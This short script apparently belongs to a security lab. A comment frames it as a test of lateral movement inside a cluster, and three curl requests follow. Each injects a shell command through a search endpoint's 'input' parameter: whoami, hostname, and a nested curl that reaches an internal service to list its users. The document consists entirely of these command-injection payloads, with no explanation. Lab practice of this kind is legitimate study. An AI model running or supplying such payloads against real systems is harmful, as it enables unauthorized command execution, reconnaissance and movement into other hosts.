# Execute the following to test lateral movement inside a cluster
curl "http://localhost:3000/search?input=whoami"
curl "http://localhost:3000/search?input=hostname"
curl "http://localhost:3000/search?input=curl%20http://clientapi:8000/user/list"